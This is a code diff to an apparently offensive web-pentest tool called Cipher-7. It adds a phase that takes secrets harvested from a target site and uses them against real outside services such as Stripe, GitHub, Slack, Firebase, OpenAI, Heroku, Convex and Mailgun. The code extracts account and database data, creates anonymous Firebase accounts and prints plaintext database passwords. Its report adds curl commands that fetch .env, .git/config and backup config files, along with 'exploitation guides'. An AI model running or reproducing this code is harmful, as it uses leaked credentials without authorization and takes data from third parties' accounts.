@@ -7433,7 +7433,11 @@ export async function runWebPentest(targetUrl: string): Promise<{
     exposed_config_files: { path: string; status: number; size: number; rawContent: string; parsedKeys: { key: string; value: string }[] }[];
     lfi_proof: { url: string; payload: string; rawContent: string; leakType: string }[];
     ssrf_proof: { url: string; payload: string; provider: string; rawContent: string; credentialsFound: boolean }[];
+    secret_validations: { type: string; value: string; source: string; status: "valid" | "invalid" | "expired" | "partial" | "unknown"; service: string; liveProof: string; accessLevel: string; extractedData: Record<string, unknown> | null; httpStatus: number | null; responseSnippet: string; testedAt: string }[];
     totalExposures: number;
+    totalValidated: number;
+    validSecrets: number;
+    invalidSecrets: number;
   };
   generatedAt: string;
   targetUrl: string;
@@ -8710,6 +8714,245 @@ if __name__ == "__main__":
     ...poeSSRFProbes, ...poeSSRFFollowUp,
   ]);
 
+  // ═══════════════════════════════════════════════════════════════
+  // ACTIVE SECRET VALIDATION — Phase 5.5: Live Proof of Exploitation
+  // Connects to real services to verify each discovered secret
+  // ═══════════════════════════════════════════════════════════════
+  interface SecretValidation {
+    type: string;
+    value: string;
+    source: string;
+    status: "valid" | "invalid" | "expired" | "partial" | "unknown";
+    service: string;
+    liveProof: string;
+    accessLevel: string;
+    extractedData: Record<string, unknown> | null;
+    httpStatus: number | null;
+    responseSnippet: string;
+    testedAt: string;
+  }
+  const secretValidations: SecretValidation[] = [];
+
+  // Merge all discovered secrets (allSecrets + poeSecrets) for validation
+  const allSecretsToValidate: { type: string; value: string; source: string }[] = [
+    ...allSecrets.map(s => ({ type: s.type, value: s.value, source: s.source })),
+    ...poeSecrets.filter(ps => !allSecrets.some(s => s.value === ps.value)),
+  ];
+
+  async function validateSecret(secret: { type: string; value: string; source: string }): Promise<void> {
+    const baseResult: Omit<SecretValidation, "status" | "liveProof" | "accessLevel" | "extractedData" | "httpStatus" | "responseSnippet"> = {
+      type: secret.type, value: secret.value, source: secret.source, service: "", testedAt: new Date().toISOString(),
+    };
+    try {
+      // ── PostHog API Key ──
+      if (secret.type.includes("PostHog") || /^phc_[A-Za-z0-9]{30,}$/.test(secret.value)) {
+        const r = await probeFetch(`https://us.i.posthog.com/api/projects/?personal_api_key=${secret.value}`, { timeoutMs: 8000 });
+        const r2 = await probeFetch(`https://app.posthog.com/api/projects/`, { timeoutMs: 8000, headers: { Authorization: `Bearer ${secret.value}` } as any });
+        const resp = r2 && r2.status < 500 ? r2 : r;
+        if (resp) {
+          const isValid = resp.status === 200;
+          let extracted: Record<string, unknown> | null = null;
+          if (isValid) { try { extracted = JSON.parse(resp.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "PostHog Analytics", status: isValid ? "valid" : resp.status === 401 ? "invalid" : "unknown", liveProof: isValid ? `PostHog API استجاب بنجاح — HTTP ${resp.status}` : `PostHog API رفض المفتاح — HTTP ${resp.status}`, accessLevel: isValid ? "قراءة بيانات التحليلات والمستخدمين" : "لا يوجد وصول", extractedData: extracted, httpStatus: resp.status, responseSnippet: resp.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── Convex Cloud URL ──
+      if (secret.type.includes("Convex") || /convex\.cloud/.test(secret.value)) {
+        const convexUrl = secret.value.replace(/\/$/, "");
+        // Try querying common Convex functions
+        const endpoints = [
+          { path: "/api/query", body: JSON.stringify({ path: "messages:list", args: {} }) },
+          { path: "/api/query", body: JSON.stringify({ path: "users:list", args: {} }) },
+          { path: "/api/query", body: JSON.stringify({ path: "tasks:list", args: {} }) },
+          { path: "/.well-known/openid-configuration", body: null },
+          { path: "/version", body: null },
+        ];
+        let bestResp: { status: number; body: string } | null = null;
+        let dataExtracted: Record<string, unknown> | null = null;
+        let accessDesc = "لا يوجد وصول";
+        for (const ep of endpoints) {
+          const r = ep.body
+            ? await probeFetch(`${convexUrl}${ep.path}`, { method: "POST", headers: { "Content-Type": "application/json" } as any, body: ep.body, timeoutMs: 8000 })
+            : await probeFetch(`${convexUrl}${ep.path}`, { timeoutMs: 8000 });
+          if (r && (r.status === 200 || (r.status < 500 && !bestResp))) {
+            bestResp = r;
+            if (r.status === 200) {
+              try { dataExtracted = JSON.parse(r.body); } catch {}
+              accessDesc = `وصول مباشر لقاعدة البيانات — ${ep.path}`;
+              break;
+            }
+          }
+        }
+        if (bestResp) {
+          secretValidations.push({ ...baseResult, service: "Convex Cloud Database", status: bestResp.status === 200 ? "valid" : "partial", liveProof: bestResp.status === 200 ? `Convex DB متاحة — تم استخراج البيانات` : `Convex endpoint يستجيب — HTTP ${bestResp.status}`, accessLevel: accessDesc, extractedData: dataExtracted, httpStatus: bestResp.status, responseSnippet: bestResp.body.slice(0, 1500) });
+        }
+        return;
+      }
+      // ── Firebase API Key ──
+      if (secret.type.includes("Firebase") || secret.type.includes("FIREBASE") || /^AIza[0-9A-Za-z_-]{33}$/.test(secret.value)) {
+        // Test key via Firebase Auth REST API
+        const r = await probeFetch(`https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${secret.value}`, { method: "POST", headers: { "Content-Type": "application/json" } as any, body: JSON.stringify({ returnSecureToken: true }), timeoutMs: 8000 });
+        if (r) {
+          const isValid = r.status === 200;
+          const isDisabled = r.status === 400 && /ADMIN_ONLY_OPERATION|API_KEY_INVALID/i.test(r.body);
+          let extracted: Record<string, unknown> | null = null;
+          if (isValid) { try { extracted = JSON.parse(r.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "Firebase / Google Cloud", status: isValid ? "valid" : isDisabled ? "partial" : "invalid", liveProof: isValid ? `Firebase Auth يقبل إنشاء حسابات مجهولة — خطر حرج!` : isDisabled ? `مفتاح Firebase صالح لكن العملية محظورة (${r.status})` : `مفتاح Firebase غير صالح — HTTP ${r.status}`, accessLevel: isValid ? "إنشاء حسابات + قراءة/كتابة Firestore (محتمل)" : "محدود أو معطّل", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── AWS Access Key ──
+      if (secret.type.includes("AWS_ACCESS") || /^AKIA[0-9A-Z]{16}$/.test(secret.value)) {
+        // We can only verify AWS keys if we have both access key + secret key
+        // Just validate the format and mark as needs-pair
+        const isValidFormat = /^AKIA[0-9A-Z]{16}$/.test(secret.value);
+        secretValidations.push({ ...baseResult, service: "Amazon Web Services (AWS)", status: isValidFormat ? "partial" : "invalid", liveProof: isValidFormat ? `صيغة AWS Access Key صحيحة — يحتاج Secret Key للتحقق الكامل` : `صيغة AWS Access Key غير صحيحة`, accessLevel: "يحتاج Secret Key للتحقق", extractedData: null, httpStatus: null, responseSnippet: `Format: ${isValidFormat ? "Valid AKIA prefix" : "Invalid format"}` });
+        return;
+      }
+      // ── Stripe Key ──
+      if (secret.type.includes("Stripe") || secret.type.includes("STRIPE") || /^(sk|pk)_(live|test)_[0-9A-Za-z]{24,}$/.test(secret.value)) {
+        const isSecret = secret.value.startsWith("sk_");
+        const isLive = secret.value.includes("_live_");
+        if (isSecret) {
+          const r = await probeFetch("https://api.stripe.com/v1/balance", { headers: { Authorization: `Bearer ${secret.value}` } as any, timeoutMs: 8000 });
+          if (r) {
+            const isValid = r.status === 200;
+            let extracted: Record<string, unknown> | null = null;
+            if (isValid) { try { extracted = JSON.parse(r.body); } catch {} }
+            secretValidations.push({ ...baseResult, service: `Stripe (${isLive ? "LIVE" : "TEST"})`, status: isValid ? "valid" : r.status === 401 ? "invalid" : "unknown", liveProof: isValid ? `Stripe API استجاب — تم الوصول للرصيد ${isLive ? "⚠️ حساب حقيقي!" : "(حساب تجريبي)"}` : `Stripe رفض المفتاح — HTTP ${r.status}`, accessLevel: isValid ? `قراءة الرصيد والمعاملات ${isLive ? "— حساب إنتاجي!" : ""}` : "لا يوجد وصول", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+          }
+        } else {
+          // Public key - limited validation
+          secretValidations.push({ ...baseResult, service: `Stripe Public (${isLive ? "LIVE" : "TEST"})`, status: "partial", liveProof: `مفتاح Stripe عام — يُستخدم في الفرونت إند لعمليات محدودة`, accessLevel: "إنشاء tokens فقط (محدود)", extractedData: null, httpStatus: null, responseSnippet: "" });
+        }
+        return;
+      }
+      // ── GitHub Token ──
+      if (secret.type.includes("GITHUB") || /^gh[pousr]_[A-Za-z0-9_]{36,}$/.test(secret.value)) {
+        const r = await probeFetch("https://api.github.com/user", { headers: { Authorization: `Bearer ${secret.value}`, "User-Agent": "Cipher7-Validator" } as any, timeoutMs: 8000 });
+        if (r) {
+          const isValid = r.status === 200;
+          let extracted: Record<string, unknown> | null = null;
+          if (isValid) { try { extracted = JSON.parse(r.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "GitHub", status: isValid ? "valid" : r.status === 401 ? "invalid" : "expired", liveProof: isValid ? `GitHub Token صالح — تم الوصول لبيانات المستخدم: ${(extracted as any)?.login || "unknown"}` : `GitHub Token غير صالح — HTTP ${r.status}`, accessLevel: isValid ? `مستودعات + بيانات المستخدم: ${(extracted as any)?.login}` : "لا يوجد وصول", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── Slack Token ──
+      if (secret.type.includes("Slack") || secret.type.includes("SLACK") || /^xox[bprs]-/.test(secret.value)) {
+        const r = await probeFetch("https://slack.com/api/auth.test", { method: "POST", headers: { Authorization: `Bearer ${secret.value}`, "Content-Type": "application/x-www-form-urlencoded" } as any, timeoutMs: 8000 });
+        if (r) {
+          let parsed: any = {};
+          try { parsed = JSON.parse(r.body); } catch {}
+          const isValid = parsed.ok === true;
+          secretValidations.push({ ...baseResult, service: "Slack", status: isValid ? "valid" : "invalid", liveProof: isValid ? `Slack Token صالح — Workspace: ${parsed.team} — User: ${parsed.user}` : `Slack Token غير صالح — ${parsed.error || `HTTP ${r.status}`}`, accessLevel: isValid ? `إرسال رسائل + قراءة القنوات في ${parsed.team}` : "لا يوجد وصول", extractedData: isValid ? parsed : null, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── Vercel Deploy ID / Token ──
+      if (secret.type.includes("Vercel") || /^dpl_[A-Za-z0-9]{20,}$/.test(secret.value)) {
+        // Vercel deploy IDs are not auth tokens, but we can check if deployment info is accessible
+        const r = await probeFetch(`https://api.vercel.com/v13/deployments/${secret.value}`, { timeoutMs: 8000 });
+        if (r) {
+          let extracted: Record<string, unknown> | null = null;
+          if (r.status === 200) { try { extracted = JSON.parse(r.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "Vercel", status: r.status === 200 ? "valid" : "partial", liveProof: r.status === 200 ? `معلومات النشر متاحة — تم استخراج تفاصيل المشروع` : `Vercel Deploy ID مكشوف — HTTP ${r.status} (يحتاج Bearer Token للوصول الكامل)`, accessLevel: r.status === 200 ? "معلومات النشر والمشروع" : "معرّف مكشوف فقط", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── JWT Token ──
+      if (secret.type.includes("JWT") || /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(secret.value)) {
+        try {
+          const parts = secret.value.split(".");
+          const header = JSON.parse(Buffer.from(parts[0], "base64url").toString());
+          const payload = JSON.parse(Buffer.from(parts[1], "base64url").toString());
+          const isExpired = payload.exp ? payload.exp * 1000 < Date.now() : false;
+          secretValidations.push({ ...baseResult, service: "JWT Token", status: isExpired ? "expired" : "valid", liveProof: isExpired ? `JWT منتهي الصلاحية منذ ${new Date(payload.exp * 1000).toISOString()}` : `JWT صالح — Algorithm: ${header.alg} — Subject: ${payload.sub || "N/A"}`, accessLevel: isExpired ? "منتهي — لكن يكشف بنية النظام" : `مصادقة كـ ${payload.sub || payload.email || payload.user_id || "unknown"}`, extractedData: { header, payload, expired: isExpired }, httpStatus: null, responseSnippet: JSON.stringify({ header, payload }, null, 2) });
+        } catch {
+          secretValidations.push({ ...baseResult, service: "JWT Token", status: "invalid", liveProof: "فشل تحليل JWT — صيغة غير صحيحة", accessLevel: "لا يوجد", extractedData: null, httpStatus: null, responseSnippet: "" });
+        }
+        return;
+      }
+      // ── SendGrid Key ──
+      if (secret.type.includes("SENDGRID") || /^SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}$/.test(secret.value)) {
+        const r = await probeFetch("https://api.sendgrid.com/v3/user/profile", { headers: { Authorization: `Bearer ${secret.value}` } as any, timeoutMs: 8000 });
+        if (r) {
+          const isValid = r.status === 200;
+          let extracted: Record<string, unknown> | null = null;
+          if (isValid) { try { extracted = JSON.parse(r.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "SendGrid Email", status: isValid ? "valid" : "invalid", liveProof: isValid ? `SendGrid API صالح — يمكن إرسال بريد إلكتروني باسم المالك!` : `SendGrid رفض المفتاح — HTTP ${r.status}`, accessLevel: isValid ? "إرسال بريد + قراءة الإحصائيات" : "لا يوجد وصول", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── Database URL ──
+      if (secret.type.includes("DATABASE") || /^(?:mongodb|postgres|mysql|redis):\/\//.test(secret.value)) {
+        // Don't actually connect to databases - just validate format and extract info
+        const urlMatch = secret.value.match(/^(mongodb(?:\+srv)?|postgres(?:ql)?|mysql|redis|amqp):\/\/([^:]+):([^@]+)@([^/]+)\/?(.*)/);
+        if (urlMatch) {
+          const [, proto, user, pass, host, db] = urlMatch;
+          secretValidations.push({ ...baseResult, service: `${proto.toUpperCase()} Database`, status: "valid", liveProof: `عنوان قاعدة بيانات مكشوف — المستخدم: ${user} — الخادم: ${host} — القاعدة: ${db || "default"}`, accessLevel: `وصول كامل لقاعدة البيانات كمستخدم ${user}`, extractedData: { protocol: proto, username: user, password: pass, host, database: db || "default" }, httpStatus: null, responseSnippet: `Protocol: ${proto}\nUser: ${user}\nPassword: ${pass}\nHost: ${host}\nDatabase: ${db || "default"}` });
+        }
+        return;
+      }
+      // ── OpenAI Key ──
+      if (secret.type.includes("OPENAI") || /^sk-[A-Za-z0-9]{20}T3BlbkFJ/.test(secret.value)) {
+        const r = await probeFetch("https://api.openai.com/v1/models", { headers: { Authorization: `Bearer ${secret.value}` } as any, timeoutMs: 8000 });
+        if (r) {
+          const isValid = r.status === 200;
+          let extracted: Record<string, unknown> | null = null;
+          if (isValid) { try { extracted = JSON.parse(r.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "OpenAI", status: isValid ? "valid" : r.status === 401 ? "invalid" : "expired", liveProof: isValid ? `OpenAI API صالح — يمكن استخدام GPT/DALL-E على حساب المالك!` : `OpenAI رفض المفتاح — HTTP ${r.status}`, accessLevel: isValid ? "استخدام GPT-4, DALL-E, Whisper على حساب المالك" : "لا يوجد وصول", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── HEROKU API Key (UUID format) ──
+      if (secret.type.includes("HEROKU") || secret.type.includes("heroku")) {
+        const r = await probeFetch("https://api.heroku.com/account", { headers: { Authorization: `Bearer ${secret.value}`, Accept: "application/vnd.heroku+json; version=3" } as any, timeoutMs: 8000 });
+        if (r) {
+          const isValid = r.status === 200;
+          let extracted: Record<string, unknown> | null = null;
+          if (isValid) { try { extracted = JSON.parse(r.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "Heroku", status: isValid ? "valid" : "invalid", liveProof: isValid ? `Heroku API صالح — تم الوصول لحساب: ${(extracted as any)?.email || "unknown"}` : `Heroku API رفض المفتاح — HTTP ${r.status} — القيمة: ${secret.value}`, accessLevel: isValid ? `وصول كامل لحساب Heroku: ${(extracted as any)?.email}` : "لا يوجد وصول — المفتاح غير صالح", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── Mailgun Key ──
+      if (secret.type.includes("MAILGUN") || /^key-[0-9a-zA-Z]{32}$/.test(secret.value)) {
+        const r = await probeFetch("https://api.mailgun.net/v3/domains", { headers: { Authorization: `Basic ${Buffer.from(`api:${secret.value}`).toString("base64")}` } as any, timeoutMs: 8000 });
+        if (r) {
+          const isValid = r.status === 200;
+          let extracted: Record<string, unknown> | null = null;
+          if (isValid) { try { extracted = JSON.parse(r.body); } catch {} }
+          secretValidations.push({ ...baseResult, service: "Mailgun", status: isValid ? "valid" : "invalid", liveProof: isValid ? `Mailgun API صالح — يمكن إرسال بريد إلكتروني!` : `Mailgun رفض المفتاح — HTTP ${r.status}`, accessLevel: isValid ? "إرسال بريد + إدارة النطاقات" : "لا يوجد وصول", extractedData: extracted, httpStatus: r.status, responseSnippet: r.body.slice(0, 1000) });
+        }
+        return;
+      }
+      // ── Generic / Email / Unknown ──
+      if (secret.type.includes("Email")) {
+        secretValidations.push({ ...baseResult, service: "Email Address", status: "valid", liveProof: `بريد إلكتروني مكشوف — يمكن استخدامه في هجمات التصيد (Phishing)`, accessLevel: "معلومات اتصال مكشوفة", extractedData: null, httpStatus: null, responseSnippet: secret.value });
+        return;
+      }
+      // ── Internal URL / Localhost ──
+      if (secret.type.includes("Internal") || /127\.0\.0\.1|localhost/i.test(secret.value)) {
+        secretValidations.push({ ...baseResult, service: "Internal Service", status: "valid", liveProof: `عنوان خدمة داخلية مكشوف — يكشف بنية النظام الداخلي`, accessLevel: "معلومات بنية داخلية", extractedData: null, httpStatus: null, responseSnippet: secret.value });
+        return;
+      }
+      // ── Bearer Token (generic) ──
+      if (secret.type.includes("BEARER")) {
+        secretValidations.push({ ...baseResult, service: "Bearer Token", status: "unknown", liveProof: `توكن Bearer مكشوف — يحتاج تحديد الخدمة للتحقق الكامل`, accessLevel: "غير محدد — يعتمد على الخدمة", extractedData: null, httpStatus: null, responseSnippet: secret.value.slice(0, 100) });
+        return;
+      }
+      // ── Fallback: try to validate as generic API key if no specific handler ──
+      secretValidations.push({ ...baseResult, service: secret.type, status: "unknown", liveProof: `سر مكتشف — النوع: ${secret.type} — لم يتم التحقق تلقائياً`, accessLevel: "يحتاج تحقق يدوي", extractedData: null, httpStatus: null, responseSnippet: secret.value.slice(0, 200) });
+    } catch {
+      secretValidations.push({ ...baseResult, service: secret.type, status: "unknown", liveProof: "فشل الاتصال بالخدمة للتحقق", accessLevel: "غير محدد", extractedData: null, httpStatus: null, responseSnippet: "" });
+    }
+  }
+
+  // Run all validations in parallel
+  await Promise.allSettled(allSecretsToValidate.slice(0, 30).map(s => validateSecret(s)));
+
   // ═══ UPDATE RISK SCORE ═══
   riskScore += vulnResults.filter(v => v.severity === "critical").length * 20;
   riskScore += vulnResults.filter(v => v.severity === "high").length * 10;
@@ -9779,9 +10022,50 @@ if __name__ == "__main__":
         `for f in .env .env.local .env.production .git/config wp-config.php.bak; do echo "=== $f ===" && curl -s "${baseUrl}/$f" | head -20; done`,
       ],
     },
+    // ═══ ACTIVE SECRET VALIDATION — Phase 5.5 ═══
+    {
+      id: 27, title: "Cipher-7: التحقق الفعلي من الأسرار — Active Secret Validation",
+      details: `${secretValidations.length} سر تم فحصه — ${secretValidations.filter(v => v.status === "valid").length} صالح — ${secretValidations.filter(v => v.status === "invalid").length} غير صالح — ${secretValidations.filter(v => v.status === "expired").length} منتهي`,
+      status: (secretValidations.filter(v => v.status === "valid").length > 0 ? "danger" as const : "success" as const),
+      findings: [
+        `╔══════════════════════════════════════════════════════════════╗`,
+        `║   ACTIVE SECRET VALIDATION — التحقق الفعلي v1.0            ║`,
+        `║   Cipher-7 v13.0 — Live Exploitation Proof                  ║`,
+        `╚══════════════════════════════════════════════════════════════╝`,
+        ``,
+        `═══ ملخص التحقق الفعلي ═══`,
+        `   🔍 إجمالي الأسرار المفحوصة: ${secretValidations.length}`,
+        `   ✅ صالح (يعمل فعلاً): ${secretValidations.filter(v => v.status === "valid").length}`,
+        `   ❌ غير صالح: ${secretValidations.filter(v => v.status === "invalid").length}`,
+        `   ⏰ منتهي الصلاحية: ${secretValidations.filter(v => v.status === "expired").length}`,
+        `   🟡 جزئي: ${secretValidations.filter(v => v.status === "partial").length}`,
+        `   ❓ غير محدد: ${secretValidations.filter(v => v.status === "unknown").length}`,
+        ``,
+        ...secretValidations.map((v, idx) => [
+          `═══ [${idx + 1}/${secretValidations.length}] ${v.service} — ${v.type} ═══`,
+          `   📋 الحالة: ${v.status === "valid" ? "🔴 صالح — خطر حقيقي!" : v.status === "invalid" ? "✅ غير صالح — لا خطر" : v.status === "expired" ? "🟡 منتهي — كان صالحاً" : v.status === "partial" ? "🟠 جزئي — وصول محدود" : "❓ غير محدد"}`,
+          `   🔑 القيمة: ${v.value}`,
+          `   📍 المصدر: ${v.source}`,
+          `   🧪 إثبات الاستغلال: ${v.liveProof}`,
+          `   🔐 مستوى الوصول: ${v.accessLevel}`,
+          v.httpStatus ? `   📡 HTTP Response: ${v.httpStatus}` : "",
+          v.responseSnippet ? `   📄 رد الخادم (مقتطف):\n      ${v.responseSnippet.slice(0, 500).replace(/\n/g, "\n      ")}` : "",
+          v.extractedData ? `   📦 البيانات المستخرجة: ${JSON.stringify(v.extractedData, null, 2).slice(0, 800).replace(/\n/g, "\n      ")}` : "",
+          `   ⏱️ وقت الفحص: ${v.testedAt}`,
+          ``,
+        ]).flat().filter(Boolean),
+        `═══ الخلاصة ═══`,
+        secretValidations.filter(v => v.status === "valid").length > 0
+          ? `   🔴 تم إثبات ${secretValidations.filter(v => v.status === "valid").length} سر صالح فعلياً — خطر حقيقي ومؤكد!`
+          : `   ✅ لم يتم إثبات أي سر صالح — الأسرار المكتشفة غير فعّالة`,
+      ].filter(Boolean),
+      commands: secretValidations.filter(v => v.httpStatus).slice(0, 5).map(v =>
+        `# ${v.service}: curl -s -o /dev/null -w "%{http_code}" "${v.value.startsWith("http") ? v.value : `API endpoint for ${v.type}`}"`
+      ),
+    },
     // ═══ EXPLOITATION GUIDES (one step per secret type) ═══
     ...exploitGuides.map((guide, idx) => ({
-      id: 27 + idx,
+      id: 28 + idx,
       title: `دليل الاستغلال: ${guide.secretType}`,
       details: guide.description,
       status: "danger" as const,
@@ -10003,15 +10287,19 @@ ${poeSSRFResults.map(r => `  ${r.provider}: ${r.credentialsFound ? "بيانات
       aws: webCipher7AWS,
       securityHeaders: secHeaders,
       totalFindings: webCipher7Crypto.length + webCipher7AWS.length + allSecrets.length + accessiblePaths.length + missingHeaders.length + vulnResults.length + webData.domXssSinks.length + webData.cookies.filter(c => c.issues.length > 0).length + infoDisclosures.length + authWeaknesses.length + poeSecrets.length + poeConfigFiles.length + poeLFIResults.length + poeSSRFResults.length,
-      phasesExecuted: 19,
-      engineVersion: "12.0-web-poe",
+      phasesExecuted: 20,
+      engineVersion: "13.0-web-poe-active",
     },
     proof_of_exposure: {
       extracted_plaintext_secrets: poeSecrets.map(s => ({ type: s.type, value: s.value, source: s.source })),
       exposed_config_files: poeConfigFiles.map(cf => ({ path: cf.path, status: cf.status, size: cf.size, rawContent: cf.rawContent, parsedKeys: cf.parsedKeys })),
       lfi_proof: poeLFIResults.map(r => ({ url: r.url, payload: r.payload, rawContent: r.rawContent, leakType: r.leakType })),
       ssrf_proof: poeSSRFResults.map(r => ({ url: r.url, payload: r.payload, provider: r.provider, rawContent: r.rawContent, credentialsFound: r.credentialsFound })),
+      secret_validations: secretValidations,
       totalExposures: poeSecrets.length + poeConfigFiles.length + poeLFIResults.length + poeSSRFResults.length,
+      totalValidated: secretValidations.length,
+      validSecrets: secretValidations.filter(v => v.status === "valid").length,
+      invalidSecrets: secretValidations.filter(v => v.status === "invalid").length,
     },
     generatedAt: new Date().toISOString(),
     targetUrl: webData.url,
